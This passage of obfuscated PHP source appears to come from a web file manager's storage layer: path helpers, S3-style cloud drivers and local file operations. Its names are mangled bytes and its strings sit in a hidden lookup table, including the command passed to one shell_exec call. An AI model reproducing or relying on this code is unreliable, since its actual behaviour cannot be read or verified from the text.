$şû²îªŞ) { $ºü…â = IO::hashSimple($˜å¾äœÈ[$˜ÊŞ‰³Ğ[87]]); Cache::set($†Ñ…º—‹, $ºü…â ? $ºü…â : $•”ŒâÜ, 3600 * 24 * 30); } return $ºü…â ? $ºü…â : $•”ŒâÜ; } public static function hashPathSafe($ÏÅËÑŒ, $›ØÑ´°· = false) { $ÖÅ•ÔĞÖ =& $_SERVER[€ä¾™²]; $Œ÷ìÃÖ¯ = self::hashPath($ÏÅËÑŒ, $›ØÑ´°·); return md5($Œ÷ìÃÖ¯ . $ÖÅ•ÔĞÖ[1423] . Model($ÖÅ•ÔĞÖ[873])->get($ÖÅ•ÔĞÖ[874])); } public static function initSystemPath() { $ˆÑø†œ‰ =& $_SERVER[€ä¾™²]; if (defined($ˆÑø†œ‰[1424])) { return; } define($ˆÑø†œ‰[1424], self::systemPath($ˆÑø†œ‰[190])); define($ˆÑø†œ‰[1425], self::systemPath($ˆÑø†œ‰[1426])); define($ˆÑø†œ‰[1427], self::systemPath($ˆÑø†œ‰[1428])); define($ˆÑø†œ‰[1429], self::systemPath($ˆÑø†œ‰[1430])); IOHistory::bindEvent(); } public static function systemPath($Ó‹åÅÌ) { $Ã©ÄÒÇñ =& $_SERVER[€ä¾™²]; $€ò—ã” = $Ã©ÄÒÇñ[1431] . ucfirst($Ó‹åÅÌ); $§áßŞğ = Model($Ã©ÄÒÇñ[873])->get($€ò—ã”); if ($§áßŞğ) { return $§áßŞğ; } if ($Ó‹åÅÌ == $Ã©ÄÒÇñ[190]) { $§áßŞğ = self::make(Model($Ã©ÄÒÇñ[932])->systemRootPathAdd($Ã©ÄÒÇñ[635])); } else { $§áßŞğ = self::systemPath($Ã©ÄÒÇñ[190]); $Î¶¤Î¤ = self::sourceID($§áßŞğ); $§áßŞğ = self::make(Model($Ã©ÄÒÇñ[932])->mkdir($Î¶¤Î¤, $Ó‹åÅÌ)); } Model($Ã©ÄÒÇñ[873])->set($€ò—ã”, $§áßŞğ); return $§áßŞğ; } public static function systemFolder($èœ—Ø£Ï) { $¿±œ˜›  = IO_PATH_SYSTEM_SOURCE . $èœ—Ø£Ï; $ë½ıòŒÖ = Cache::get($¿±œ˜› ); if (!$ë½ıòŒÖ) { $ƒ¯Ò¬Ë” = IO::infoFullSimple($¿±œ˜› ); if (!$ƒ¯Ò¬Ë”) { $ë½ıòŒÖ = IO::mkdir($¿±œ˜› , REPEAT_SKIP); } else { $ë½ıòŒÖ = $ƒ¯Ò¬Ë”[$_SERVER[€ä¾™²][87]]; } Cache::set($¿±œ˜› , $ë½ıòŒÖ, 3600 * 10); } return $ë½ıòŒÖ; } public static function defaultDriver() { return Model($_SERVER[€ä¾™²][868])->defaultDriver(); } public static function defaultDriverInit() { $×¸®ªÕ =& $_SERVER[€ä¾™²]; static $¼§–‚ÅÜ = false; if ($¼§–‚ÅÜ) { return $¼§–‚ÅÜ; } $§ï¯ˆéÈ = self::defaultDriver(); $¼§–‚ÅÜ = IO::init($×¸®ªÕ[1432] . $§ï¯ˆéÈ[$×¸®ªÕ[486]] . $×¸®ªÕ[1420]); return $¼§–‚ÅÜ; } public static function fileTypeList() { $½Úší¬÷ =& $_SERVER[€ä¾™²]; $½®ÖğşŒ = $GLOBALS[$½Úší¬÷[6]][$½Úší¬÷[1433]]; foreach ($½®ÖğşŒ as $ÂÍë¶â¦ => $çÎëŒÆ) { $ÌÍË ŠÍ = $½Úší¬÷[1434] . $ÂÍë¶â¦; $Äë¸–“ = LNG($ÌÍË ŠÍ); if ($ÌÍË ŠÍ != $Äë¸–“) { $½®ÖğşŒ[$ÂÍë¶â¦][$½Úší¬÷[32]] = $Äë¸–“; } } return $½®ÖğşŒ; } public static function ioFileDriverGet($ß‚Ò¾˜ = '') { $¤É¸³®Ñ =& $_SERVER[€ä¾™²]; static $ èˆËà­ = array(); static $¤ôù¸€Ï = array(); static $ìĞ”’µ° = array(); static $ÒÎ–ûİÉ = false; if ($ÒÎ–ûİÉ === !1) { $ÒÎ–ûİÉ = array($¤É¸³®Ñ[605] => array(), $¤É¸³®Ñ[691] => array()); $˜¯ñâ²† = Model($¤É¸³®Ñ[1435])->get(!1, $¤É¸³®Ñ[1436]); foreach ($˜¯ñâ²† as $Ä¥¸‚¬µ => $˜Œ­”„) { if (!$˜Œ­”„ || $˜Œ­”„ == $¤É¸³®Ñ[12]) { continue; } if (strstr($Ä¥¸‚¬µ, $¤É¸³®Ñ[1437])) { $£Ÿ¶ã‹Â = str_replace($¤É¸³®Ñ[1437], $¤É¸³®Ñ[12], $Ä¥¸‚¬µ); $ÒÎ–ûİÉ[$¤É¸³®Ñ[605]][$£Ÿ¶ã‹Â] = $˜Œ­”„; } else { if (strstr($Ä¥¸‚¬µ, $¤É¸³®Ñ[1438])) { $£Ÿ¶ã‹Â = str_replace($¤É¸³®Ñ[1438], $¤É¸³®Ñ[12], $Ä¥¸‚¬µ); $ÒÎ–ûİÉ[$¤É¸³®Ñ[691]][$£Ÿ¶ã‹Â] = $˜Œ­”„; } } } } $ŸÔº¼Œ¡ = self::defaultDriver(); if (!$ß‚Ò¾˜ || !$ÒÎ–ûİÉ[$¤É¸³®Ñ[605]] && !$ÒÎ–ûİÉ[$¤É¸³®Ñ[691]]) { return $ŸÔº¼Œ¡; } $éÚÈñÒ = self::getPathSourceID($ß‚Ò¾˜); if (!$éÚÈñÒ) { return $ŸÔº¼Œ¡; } if (isset($ èˆËà­[$éÚÈñÒ])) { return $ èˆËà­[$éÚÈñÒ]; } $¥›‰€Îú = Model($¤É¸³®Ñ[932])->sourceInfo($éÚÈñÒ); $×Ü²¸Ñô = $¥›‰€Îú[$¤É¸³®Ñ[596]]; $²¬ğƒş = array(); if (!$¥›‰€Îú) { return $ŸÔº¼Œ¡; } if ($¥›‰€Îú[$¤É¸³®Ñ[189]] == $¤É¸³®Ñ[91]) { if (isset($ìĞ”’µ°[$×Ü²¸Ñô])) { return $ìĞ”’µ°[$×Ü²¸Ñô]; } if (isset($ÒÎ–ûİÉ[$¤É¸³®Ñ[691]][$×Ü²¸Ñô])) { $ı³ç•¼‘ = Model($¤É¸³®Ñ[868])->driverInfo($ÒÎ–ûİÉ[$¤É¸³®Ñ[691]][$×Ü²¸Ñô]); $ŸÔº¼Œ¡ = $ı³ç•¼‘ ? $ı³ç•¼‘ : $ŸÔº¼Œ¡; $ìĞ”’µ°[$×Ü²¸Ñô] = $ŸÔº¼Œ¡; $ èˆËà­[$éÚÈñÒ] = $ŸÔº¼Œ¡; return $ŸÔº¼Œ¡; } $²¬ğƒş = self::groupParentUser($×Ü²¸Ñô); } else { if ($¥›‰€Îú[$¤É¸³®Ñ[189]] == $¤É¸³®Ñ[531]) { $ˆ¦–ëÉ = Model($¤É¸³®Ñ[1439])->getInfo($×Ü²¸Ñô); if ($ˆ¦–ëÉ) { $²¬ğƒş = explode($¤É¸³®Ñ[50], trim($ˆ¦–ëÉ[$¤É¸³®Ñ[611]], $¤É¸³®Ñ[50])); $²¬ğƒş = array_remove_value($²¬ğƒş, $¤É¸³®Ñ[229]); $²¬ğƒş[] = $×Ü²¸Ñô; $²¬ğƒş = array_reverse($²¬ğƒş); } } } foreach ($²¬ğƒş as $”ÅãÄáç) { if (!isset($ÒÎ–ûİÉ[$¤É¸³®Ñ[605]][$”ÅãÄáç])) { continue; } if (isset($¤ôù¸€Ï[$”ÅãÄáç])) { return $¤ôù¸€Ï[$”ÅãÄáç]; } $ı³ç•¼‘ = Model($¤É¸³®Ñ[868])->driverInfo($ÒÎ–ûİÉ[$¤É¸³®Ñ[605]][$”ÅãÄáç]); $ŸÔº¼Œ¡ = $ı³ç•¼‘ ? $ı³ç•¼‘ : $ŸÔº¼Œ¡; $¤ôù¸€Ï[$”ÅãÄáç] = $ŸÔº¼Œ¡; break; } if ($¥›‰€Îú[$¤É¸³®Ñ[189]] == $¤É¸³®Ñ[91]) { $ìĞ”’µ°[$×Ü²¸Ñô] = $ŸÔº¼Œ¡; } $ èˆËà­[$éÚÈñÒ] = $ŸÔº¼Œ¡; return $ŸÔº¼Œ¡; } private static function getPathSourceID($“Êßá€Œ) { $‘Ãï¼ñâ =& $_SERVER[€ä¾™²]; static $›àí’ä¢ = array(); if (!$“Êßá€Œ) { return $‘Ãï¼ñâ[12]; } $şĞà¾Ø¦ = substr($“Êßá€Œ, 0, strlen($‘Ãï¼ñâ[505])) == $‘Ãï¼ñâ[505]; $”µ›´… = substr($“Êßá€Œ, 0, strlen($‘Ãï¼ñâ[1406])) == $‘Ãï¼ñâ[1406]; $ûÒÎ¨÷¨ = substr($“Êßá€Œ, 0, strlen($‘Ãï¼ñâ[1407])) == $‘Ãï¼ñâ[1407]; if (!$şĞà¾Ø¦ && !$”µ›´… && !$ûÒÎ¨÷¨) { return $‘Ãï¼ñâ[12]; } $ØÔ¥Ûªî = self::parse($“Êßá€Œ); $ªµÈ‘äï = $ØÔ¥Ûªî[$‘Ãï¼ñâ[1300]]; if ($şĞà¾Ø¦) { return $ØÔ¥Ûªî[$‘Ãï¼ñâ[486]]; } if (isset($›àí’ä¢[$ªµÈ‘äï])) { $¥­ı…ºÍ = $›àí’ä¢[$ªµÈ‘äï]; } else { $¥­ı…ºÍ = IO::init($ªµÈ‘äï); $›àí’ä¢[$ªµÈ‘äï] = $¥­ı…ºÍ; } if (isset($¥­ı…ºÍ->pathParse[$‘Ãï¼ñâ[1303]])) { return $¥­ı…ºÍ->pathParse[$‘Ãï¼ñâ[1303]]; } return $‘Ãï¼ñâ[12]; } private static function groupParentUser($¤é¦Ò©Å) { $¸£¬îØ• =& $_SERVER[€ä¾™²]; $ù³â¾ì = Model($¸£¬îØ•[624])->getInfo($¤é¦Ò©Å); if (!$ù³â¾ì) { return array(); } $ğ€±—„ = array_to_keyvalue($ù³â¾ì[$¸£¬îØ•[1440]], $¸£¬îØ•[12], $¸£¬îØ•[1441]); $èØÆÂ = array(); foreach ($ù³â¾ì[$¸£¬îØ•[1440]] as $é¨‚ôÄ­) { $èØÆÂ[] = $é¨‚ôÄ­[$¸£¬îØ•[1441]]; $¶ÈÓ² = explode($¸£¬îØ•[50], trim($é¨‚ôÄ­[$¸£¬îØ•[611]], $¸£¬îØ•[50])); $¶ÈÓ² = array_remove_value($¶ÈÓ², $¸£¬îØ•[229]); $¶ÈÓ² = array_reverse($¶ÈÓ²); $èØÆÂ = array_merge($èØÆÂ, $¶ÈÓ²); } return array_unique($èØÆÂ); } public static function diskList($Òà¬áš = true) { $áÀï©çĞ = $_SERVER[€ä¾™²][1442]; if ($Òà¬áš) { $ÃÚî¡è« = Cache::get($áÀï©çĞ); if (is_array($ÃÚî¡è«)) { return $ÃÚî¡è«; } } $ÃÚî¡è« = self::diskListGet(); Cache::set($áÀï©çĞ, $ÃÚî¡è«, 60); return $ÃÚî¡è«; } public static function diskListGet() { $¥‘ÆÑˆ¼ =& $_SERVER[€ä¾™²]; $‘„Õ•ñ× = array(); if ($GLOBALS[$¥‘ÆÑˆ¼[6]][$¥‘ÆÑˆ¼[1443]] == $¥‘ÆÑˆ¼[1444]) { $¼·ö–Á’ = $¥‘ÆÑˆ¼[1445]; for ($Ëçì‹Îú = 0; $Ëçì‹Îú < strlen($¼·ö–Á’); $Ëçì‹Îú++) { $¾‰¦“èÓ = $¼·ö–Á’[$Ëçì‹Îú] . $¥‘ÆÑˆ¼[1446]; if (file_exists($¾‰¦“èÓ)) { $‘„Õ•ñ×[] = $¾‰¦“èÓ; } } return $‘„Õ•ñ×; } if (!function_exists($¥‘ÆÑˆ¼[99])) { $‘„Õ•ñ×[] = $¥‘ÆÑˆ¼[946]; return $‘„Õ•ñ×; } $ù‹‘˜  = explode($¥‘ÆÑˆ¼[286], shell_exec($¥‘ÆÑˆ¼[1447])); array_shift($ù‹‘˜ ); array_pop($ù‹‘˜ ); $áîÙ…Ê¼ = array($¥‘ÆÑˆ¼[1448], $¥‘ÆÑˆ¼[1449], $¥‘ÆÑˆ¼[1450], $¥‘ÆÑˆ¼[1451], $¥‘ÆÑˆ¼[1452], $¥‘ÆÑˆ¼[1453], $¥‘ÆÑˆ¼[1454], $¥‘ÆÑˆ¼[1455]); foreach ($ù‹‘˜  as $ç°Ôö‡—) { $Ş¶¦–¨Í = preg_split($¥‘ÆÑˆ¼[1456], $ç°Ôö‡—); $¾‰¦“èÓ = $Ş¶¦–¨Í[count($Ş¶¦–¨Í) - 1]; if (!strstr($Ş¶¦–¨Í[0], $¥‘ÆÑˆ¼[1457]) || !$¾‰¦“èÓ) { continue; } $§ÖÇâÑÏ = rtrim($¾‰¦“èÓ, $¥‘ÆÑˆ¼[8]) . $¥‘ÆÑˆ¼[8]; $‘„Õ•ñ×[] = $§ÖÇâÑÏ; } return $‘„Õ•ñ×; } public static function isSameDisk($ìí˜ë‰Ñ, $¥Ãƒˆœº) { $şæó¢Ü =& $_SERVER[€ä¾™²]; if ($GLOBALS[$şæó¢Ü[6]][$şæó¢Ü[1443]] == $şæó¢Ü[1444]) { return strtolower(substr($ìí˜ë‰Ñ, 0, 1)) == strtolower(substr($¥Ãƒˆœº, 0, 1)); } $¬ö»¬à¯ = stat($ìí˜ë‰Ñ); $††À°€ = stat($¥Ãƒˆœº); if ($¬ö»¬à¯ === !1 || $††À°€ === !1) { return !1; } return $¬ö»¬à¯[$şæó¢Ü[1458]] === $††À°€[$şæó¢Ü[1458]]; $øçœÏ¹Ó = self::diskList(); $‰“ø”øå = !1; $Õ±§×ÈÈ = !1; sort($øçœÏ¹Ó); $øçœÏ¹Ó = array_reverse($øçœÏ¹Ó); $ìí˜ë‰Ñ = rtrim($ìí˜ë‰Ñ, $şæó¢Ü[8]) . $şæó¢Ü[8]; $¥Ãƒˆœº = rtrim($¥Ãƒˆœº, $şæó¢Ü[8]) . $şæó¢Ü[8]; foreach ($øçœÏ¹Ó as $ëßÓà•) { $Õî…¤İ¾ = strlen($ëßÓà•); if (!$‰“ø”øå && substr($ìí˜ë‰Ñ, 0, $Õî…¤İ¾) == $ëßÓà•) { $‰“ø”øå = $ëßÓà•; } if (!$Õ±§×ÈÈ && substr($¥Ãƒˆœº, 0, $Õî…¤İ¾) == $ëßÓà•) { $Õ±§×ÈÈ = $ëßÓà•; } if ($‰“ø”øå && $Õ±§×ÈÈ) { break; } } return $‰“ø”øå === $Õ±§×ÈÈ; } public static function transferType($æïµİ‹, $„æ–Ÿä) { $°Î©½¡¢ =& $_SERVER[€ä¾™²]; $œ¸áì¡Â = self::driverType($æïµİ‹); $·¹–¿Ù… = self::driverType($„æ–Ÿä); if ($œ¸áì¡Â[$°Î©½¡¢[33]] == $·¹–¿Ù…[$°Î©½¡¢[33]] && $œ¸áì¡Â[$°Î©½¡¢[1459]] == $·¹–¿Ù…[$°Î©½¡¢[1459]]) { return $°Î©½¡¢[1460]; } if ($œ¸áì¡Â[$°Î©½¡¢[33]] == $°Î©½¡¢[980] && $·¹–¿Ù…[$°Î©½¡¢[33]] == $°Î©½¡¢[107]) { return $°Î©½¡¢[1328]; } if ($œ¸áì¡Â[$°Î©½¡¢[33]] == $°Î©½¡¢[107] && $·¹–¿Ù…[$°Î©½¡¢[33]] == $°Î©½¡¢[980]) { return $°Î©½¡¢[108]; } return $°Î©½¡¢[1461]; } public static function driverType($˜Å¾û») { $şò™¾â© =& $_SERVER[€ä¾™²]; $ ÛóŞã¹ = str_replace($şò™¾â©[1462], $şò™¾â©[12], strtolower($˜Å¾û»->getType())); if ($ ÛóŞã¹ == $şò™¾â©[858] || $ ÛóŞã¹ == $şò™¾â©[1463] || $ ÛóŞã¹ == $şò™¾â©[1464]) { $Š•ë¿’“ = self::ioFileDriverGet($şò™¾â©[505] . $˜Å¾û»->pathParse[$şò™¾â©[1303]] . $şò™¾â©[403]); $˜Å¾û» = IO::init($şò™¾â©[1432] . $Š•ë¿’“[$şò™¾â©[486]] . $şò™¾â©[1420]); } else { if ($ ÛóŞã¹ == $şò™¾â©[1338] || $ ÛóŞã¹ == $şò™¾â©[1465]) { $˜Å¾û» = IO::init($˜Å¾û»->pathParse[$şò™¾â©[1280]]); } } $˜—ã› = $˜Å¾û»->path; $ ÛóŞã¹ = str_replace($şò™¾â©[1462], $şò™¾â©[12], strtolower($˜Å¾û»->getType())); if ($ ÛóŞã¹ == $şò™¾â©[107]) { return array($şò™¾â©[33] => $şò™¾â©[107], $şò™¾â©[1459] => $şò™¾â©[12], $şò™¾â©[87] => $˜—ã›, $şò™¾â©[96] => $˜Å¾û»); } return array($şò™¾â©[33] => $şò™¾â©[980], $şò™¾â©[1459] => $˜Å¾û»->pathDriver, $şò™¾â©[87] => $˜—ã›, $şò™¾â©[96] => $˜Å¾û»); } public static function pathDriverType($Ì‹é¸Œé) { return $Ì‹é¸Œé ? self::driverType(IO::init($Ì‹é¸Œé)) : !1; } public static function pathDriverLocal($®Ïê™Ûò) { $À‹¼Á†Ù =& $_SERVER[€ä¾™²]; $Ê„âÒÎÒ = $®Ïê™Ûò ? self::driverType(IO::init($®Ïê™Ûò)) : !1; return strtolower($Ê„âÒÎÒ[$À‹¼Á†Ù[33]]) == $À‹¼Á†Ù[107] ? !0 : !1; } public static function allowCover($—¦Ïœ—’, $™ËÉî© = true) { $Î‡éí®° =& $_SERVER[€ä¾™²]; if (is_string($—¦Ïœ—’)) { $—¦Ïœ—’ = IO::info($—¦Ïœ—’); } if (!$—¦Ïœ—’ || $—¦Ïœ—’[$Î‡éí®°[33]] == $Î‡éí®°[78] || $—¦Ïœ—’[$Î‡éí®°[79]] <= 100) { return !1; } if (isset($—¦Ïœ—’[$Î‡éí®°[1466]]) || !$—¦Ïœ—’[$Î‡éí®°[87]]) { return !1; } if (isset($—¦Ïœ—’[$Î‡éí®°[233]]) && !$—¦Ïœ—’[$Î‡éí®°[233]]) { return !1; } static $“şõø®ı = false; if (!$“şõø®ı || !$™ËÉî©) { $Âîë…óà = self::driverType(IO::init($—¦Ïœ—’[$Î‡éí®°[87]])); $¶±€ê·« = $Âîë…óà[$Î‡éí®°[96]]; $“şõø®ı = $Î‡éí®°[195]; if ($Âîë…óà[$Î‡éí®°[33]] == $Î‡éí®°[107]) { $“şõø®ı = $Î‡éí®°[1467]; } if ($Âîë…óà[$Î‡éí®°[96]] && is_array($Âîë…óà[$Î‡éí®°[96]]->config)) { $‹øÚ† = $Âîë…óà[$Î‡éí®°[96]]->config; if (isset($‹øÚ†[$Î‡éí®°[1468]]) && $‹øÚ†[$Î‡éí®°[1468]]) { $“şõø®ı = $Î‡éí®°[1467]; } } $ì×œş³× = KodIO::defaultDriver(); if (strtolower($ì×œş³×[$Î‡éí®°[96]]) == $Î‡éí®°[107] && is_array($ì×œş³×[$Î‡éí®°[6]])) { $ûÉî§Ğ = $ì×œş³×[$Î‡éí®°[6]][$Î‡éí®°[1312]]; if (substr($ûÉî§Ğ, 0, 2) == $Î‡éí®°[1469]) { $ûÉî§Ğ = str_replace($Î‡éí®°[1469], BASIC_PATH, $ûÉî§Ğ); } $ûÉî§Ğ = str_replace($Î‡éí®°[255], $Î‡éí®°[8], $ûÉî§Ğ); if (substr($—¦Ïœ—’[$Î‡éí®°[87]], 0, strlen($ûÉî§Ğ)) == $ûÉî§Ğ) { $“şõø®ı = $Î‡éí®°[195]; } } } return $“şõø®ı == $Î‡éí®°[1467] ? !0 : !1; } } class PathDriverBOS extends PathDriverS3 { public function __construct($çúõşì¿) { parent::__construct($çúõşì¿); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($³ßÀàİÒ) { parent::__construct($³ßÀàİÒ); $this->setSignVersion($_SERVER[€ä¾™²][248]); } public function uploadFormData($è¶õ€‰ã, $ÏÖû¼€‰ = 3600) { $ôêÛ Ç =& $_SERVER[€ä¾™²]; $‰åË÷¾å = $ôêÛ Ç[230]; $¿®ìì÷Ó = $ôêÛ Ç[1470]; $ôâ²Ö = $ôêÛ Ç[262]; $é×š = gmdate($ôêÛ Ç[1471], time() + $ÏÖû¼€‰); $¾…¶ÂÄ = (string) time() . $ôêÛ Ç[74] . (string) (time() + $ÏÖû¼€‰); $£Ú¦‚ò™ = array($ôêÛ Ç[263] => $é×š, $ôêÛ Ç[266] => array(array($ôêÛ Ç[307] => $‰åË÷¾å), array($ôêÛ Ç[267] => $this->bucket), array($ôêÛ Ç[268], $ôêÛ Ç[269], $ôêÛ Ç[12]), array($ôêÛ Ç[271] => $ôâ²Ö), array($ôêÛ Ç[1472] => $¿®ìì÷Ó), array($ôêÛ Ç[1473] => $this->accessKey), array($ôêÛ Ç[1474] => $¾…¶ÂÄ))); $£Ú¦‚ò™ = json_encode($£Ú¦‚ò™); $°úÁüó = hash_hmac($ôêÛ Ç[1470], $¾…¶ÂÄ, $this->secret); $Ñ¦£ì±÷ = sha1($£Ú¦‚ò™); $Î’ë³‰ç = hash_hmac($ôêÛ Ç[1470], $Ñ¦£ì±÷, $°úÁüó); $†Éû = array($ôêÛ Ç[307] => $‰åË÷¾å, $ôêÛ Ç[271] => $ôâ²Ö, $ôêÛ Ç[278] => base64_encode($£Ú¦‚ò™), $ôêÛ Ç[1472] => $¿®ìì÷Ó, $ôêÛ Ç[1473] => $this->accessKey, $ôêÛ Ç[1475] => $¾…¶ÂÄ, $ôêÛ Ç[1476] => $Î’ë³‰ç, $ôêÛ Ç[207] => $this->getHost()); return $†Éû; } public function fileOutImage($ìĞ¹¬Ù¬, $…ûÜÅ¦ñ = 250) { $ˆ¨Ïö©í =& $_SERVER[€ä¾™²]; if ($this->size($ìĞ¹¬Ù¬) > 1024 * 1024 * 32) { return $this->fileOutImageServer($ìĞ¹¬Ù¬, $…ûÜÅ¦ñ); } $»®¦ŠÁ— = $this->link($ìĞ¹¬Ù¬); $»®¦ŠÁ— .= $ˆ¨Ïö©í[1477] . $…ûÜÅ¦ñ . $ˆ¨Ïö©í[1478]; $this->fileOutLink($»®¦ŠÁ—); } } goto AÉáŸë£‹ˆ; fÔÕÉæ¢ ·: class PathDriverJOS extends PathDriverBaseS3 { public function __construct($€¨ı¥‹ø) { parent::__construct($€¨ı¥‹ø); $this->setSignVersion($_SERVER[€ä¾™²][248]); } public function uploadLink($ÃÜç¿ƒó, $¡ò”Ñ«ú = 0) { $ò¼å»•µ =& $_SERVER[€ä¾™²]; if ($this->isUploadServer()) { return; } $Û—éÊä = $this->getType(); if (!in_array($Û—éÊä, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $îĞ×ÕËÍ = (!$¡ò”Ñ«ú ? 1 : ceil($¡ò”Ñ«ú / pow(1024, 3))) * 3600 * 4; $Ãâ×Âåø = $this->uploadMultiData($ÃÜç¿ƒó, $îĞ×ÕËÍ); if ($Ãâ×Âåø) { $Ãâ×Âåø[$ò¼å»•µ[95]] = $ÃÜç¿ƒó; $Ãâ×Âåø[$ò¼å»•µ[96]] = $Û—éÊä; } return $Ãâ×Âåø; } public function fileOutImage($Ü ×•…«, $¸öİ“‰Ï = 250) { if ($this->size($Ü ×•…«) > 1024 * 1024 * 25) { return $this->fileOutImageServer($Ü ×•…«, $¸öİ“‰Ï); } $­æ¯²†‘ = $this->link($Ü ×•…«); $­æ¯²†‘ .= $_SERVER[€ä¾™²][1607] . $¸öİ“‰Ï; $this->fileOutLink($­æ¯²†‘); } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($ü±Û¸æí) { if (substr($ü±Û¸æí, 0, 2) == $_SERVER[€ä¾™²][1469]) { $ü±Û¸æí = BASIC_PATH . substr($ü±Û¸æí, 2); } return $ü±Û¸æí; } public function iconvApp($å½¥ò™õ) { $ß…˜¥¦× =& $_SERVER[€ä¾™²]; global $config; return $this->iconvTo($å½¥ò™õ, $config[$ß…˜¥¦×[1593]], $config[$ß…˜¥¦×[1592]]); } public function iconvSystem($«ÒáğÌò) { $Œïæøâ =& $_SERVER[€ä¾™²]; global $config; return $this->iconvTo($«ÒáğÌò, $config[$Œïæøâ[1592]], $config[$Œïæøâ[1593]]); } public function getPathOuter($Ú…Ÿ‚‘ò) { $Ãçê³âÀ =& $_SERVER[€ä¾™²]; $©±‘¡¸Ì = $this->iconvApp($this->pathBase); $Ú…Ÿ‚‘ò = $this->iconvApp($Ú…Ÿ‚‘ò); if (substr($©±‘¡¸Ì, 0, 2) == $Ãçê³âÀ[1469]) { $©±‘¡¸Ì = BASIC_PATH . substr($©±‘¡¸Ì, 2); } if (substr($Ú…Ÿ‚‘ò, 0, 2) == $Ãçê³âÀ[1469]) { $Ú…Ÿ‚‘ò = BASIC_PATH . substr($Ú…Ÿ‚‘ò, 2); } $©±‘¡¸Ì = KodIO::clear($©±‘¡¸Ì); $Ú…Ÿ‚‘ò = KodIO::clear($Ú…Ÿ‚‘ò); $Ú…Ÿ‚‘ò = substr($Ú…Ÿ‚‘ò, strlen($©±‘¡¸Ì)); if (empty($this->pathDriver)) { return $Ú…Ÿ‚‘ò; } return $this->pathDriver . $Ãçê³âÀ[8] . ltrim($Ú…Ÿ‚‘ò, $Ãçê³âÀ[8]); } public function mkfile($ÀÔÖ«•Ø, $ç©­¯Ã = '', $¡ÕÉÉÒÛ = REPEAT_RENAME) { $ÀÔÖ«•Ø = $this->iconvSystem($ÀÔÖ«•Ø); @touch($ÀÔÖ«•Ø); if ($ç©­¯Ã) { file_put_contents($ÀÔÖ«•Ø, $ç©­¯Ã); } @chmod($ÀÔÖ«•Ø, $this->pathAuth); if (is_file($ÀÔÖ«•Ø)) { return $this->getPathOuter($ÀÔÖ«•Ø); } $this->writeLog(__FUNCTION__ . $_SERVER[€ä¾™²][1604], !0); return !1; } public function mkdir($¥ÌŠÁäï, $¸îœèïê = REPEAT_SKIP) { $¥ÌŠÁäï = $this->iconvSystem($¥ÌŠÁäï); if (is_dir($¥ÌŠÁäï)) { return $this->getPathOuter($¥ÌŠÁäï); } @mkdir($¥ÌŠÁäï, $this->pathAuth, !0); @chmod($¥ÌŠÁäï, $this->pathAuth); if (is_dir($¥ÌŠÁäï)) { return $this->getPathOuter($¥ÌŠÁäï); } $this->writeLog(__FUNCTION__ . $_SERVER[€ä¾™²][1604], !0); return !1; } public function copyFile($Í½ìõ‘ş, $°ÀøÜ) { $this->mkdir($this->pathFather($°ÀøÜ)); $Í½ìõ‘ş = $this->iconvSystem($Í½ìõ‘ş); $°ÀøÜ = $this->iconvSystem($°ÀøÜ); $ÑŒ»õ³è = copy_64($Í½ìõ‘ş, $°ÀøÜ); @chmod($°ÀøÜ, $this->pathAuth); if ($ÑŒ»õ³è) { return $this->getPathOuter($°ÀøÜ); } $this->writeLog(__FUNCTION__ . $_SERVER[€ä¾™²][1604], !0); return !1; } public function moveFile($’¡ö„Ò, $ÏŸÖ¹ì) { $this->mkdir($this->pathFather($ÏŸÖ¹ì)); $’¡ö„Ò = $this->iconvSystem($’¡ö„Ò); $ÏŸÖ¹ì = $this->iconvSystem($ÏŸÖ¹ì); $¿†ÇşÎÅ = intval(@rename($’¡ö„Ò, $ÏŸÖ¹ì)); if (!$¿†ÇşÎÅ) { if ($¿†ÇşÎÅ = intval(@copy_64($’¡ö„Ò, $ÏŸÖ¹ì))) { @unlink($’¡ö„Ò); } } @chmod($ÏŸÖ¹ì, $this->pathAuth); if ($¿†ÇşÎÅ) { return $this->getPathOuter($ÏŸÖ¹ì); } $this->writeLog(__FUNCTION__ . $_SERVER[€ä¾™²][1604], !0); return !1; } public function movePath($êŸÑÀ, $¯ÎäáÀ¼, $¯Ï…óŸ… = false) { $ğõ¶û¨– =& $_SERVER[€ä¾™²]; $êŸÑÀ = $this->iconvSystem($êŸÑÀ); $¯ÎäáÀ¼ = $this->iconvSystem($¯ÎäáÀ¼); $ÅÃ÷òœ¾ = rtrim($¯ÎäáÀ¼, $ğõ¶û¨–[8]) . $ğõ¶û¨–[8] . ($¯Ï…óŸ… ? $¯Ï…óŸ… : get_path_this($êŸÑÀ)); if (file_exists($ÅÃ÷òœ¾)) { return !1; } $üŠáš´è = intval(@rename($êŸÑÀ, $ÅÃ÷òœ¾)); $üŠáš´è = file_exists($ÅÃ÷òœ¾); if ($üŠáš´è) { return $this->getPathOuter($ÅÃ÷òœ¾); } $this->writeLog(__FUNCTION__ . $ğõ¶û¨–[1604], !0); return !1; } public function delFile($‘šš¼˜µ) { $‘šš¼˜µ = $this->iconvSystem($‘šš¼˜µ); if (!@unlink($‘šš¼˜µ)) { @chmod($‘šš¼˜µ, $this->pathAuth); if (@unlink($‘šš¼˜µ)) { return !0; } $this->writeLog(__FUNCTION__ . $_SERVER[€ä¾™²][1604], !0); return !1; } return !0; } public function delFolder($‰±şìÜÊ) { $„¡Çµ¨Ç =& $_SERVER[€ä¾™²]; $‰±şìÜÊ = $this->iconvSystem($‰±şìÜÊ); if (!is_dir($‰±şìÜÊ)) { return !0; } if (!($Æ¯Á¾Ş” = opendir($‰±şìÜÊ))) { return !1; } while (($Ùû¸ŒéÍ = readdir($Æ¯Á¾Ş”)) !== !1) { if ($Ùû¸ŒéÍ == $„¡Çµ¨Ç[10] || $Ùû¸ŒéÍ == $„¡Çµ¨Ç[1414]) { continue; } $Ä§©ĞĞ = $‰±şìÜÊ . $„¡Çµ¨Ç[8] . $Ùû¸ŒéÍ; if (is_file($Ä§©ĞĞ) || is_link($Ä§©ĞĞ)) { if (!unlink($Ä§©ĞĞ)) { chmod($Ä§©ĞĞ, $this->pathAuth); if (!unlink($Ä§©ĞĞ)) { return !1; } } } else { if (is_dir($Ä§©ĞĞ)) { chmod($Ä§©ĞĞ, $this->pathAuth); $Ä§©ĞĞ = $this->iconvApp($Ä§©ĞĞ); if 